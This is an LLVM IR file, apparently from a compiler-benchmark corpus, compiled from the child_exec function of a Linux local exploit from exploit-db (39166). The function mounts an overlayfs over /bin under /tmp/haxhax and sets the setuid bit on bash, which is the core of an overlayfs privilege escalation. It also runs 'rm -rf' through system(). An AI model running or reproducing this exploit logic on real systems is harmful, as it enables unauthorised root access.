; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_39166.c_child_exec.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_39166.c_child_exec.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [19 x i8] c"rm -rf /tmp/haxhax\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"/tmp/haxhax\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"/tmp/haxhax/w\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"/tmp/haxhax/u\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"/tmp/haxhax/o\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"overlay\00", align 1
@MS_MGC_VAL = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [59 x i8] c"lowerdir=/bin,upperdir=/tmp/haxhax/u,workdir=/tmp/haxhax/w\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [16 x i8] c"mount failed..\0A\00", align 1
@.str.8 = private unnamed_addr constant [19 x i8] c"/tmp/haxhax/w/work\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"bash\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i8*)* @child_exec to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @child_exec(i8* %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = call i32 @system(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0))
  %4 = call i32 @mkdir(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i32 511)
  %5 = call i32 @mkdir(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0), i32 511)
  %6 = call i32 @mkdir(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0), i32 511)
  %7 = call i32 @mkdir(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i32 511)
  %8 = load i32, i32* @MS_MGC_VAL, align 4
  %9 = call i64 @mount(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i32 %8, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.6, i64 0, i64 0))
  %10 = icmp ne i64 %9, 0
  br i1 %10, label %11, label %14

11:                                               ; preds = %1
  %12 = load i32, i32* @stderr, align 4
  %13 = call i32 @fprintf(i32 %12, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0))
  br label %14

14:                                               ; preds = %11, %1
  %15 = call i32 @chmod(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.8, i64 0, i64 0), i32 511)
  %16 = call i32 @chdir(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  %17 = call i32 @chmod(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0), i32 2541)
  %18 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0))
  %19 = call i32 @umount(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @mkdir(i8*, i32) #1

declare dso_local i64 @mount(i8*, i8*, i8*, i32, i8*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @chmod(i8*, i32) #1

declare dso_local i32 @chdir(i8*) #1

declare dso_local i32 @umount(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
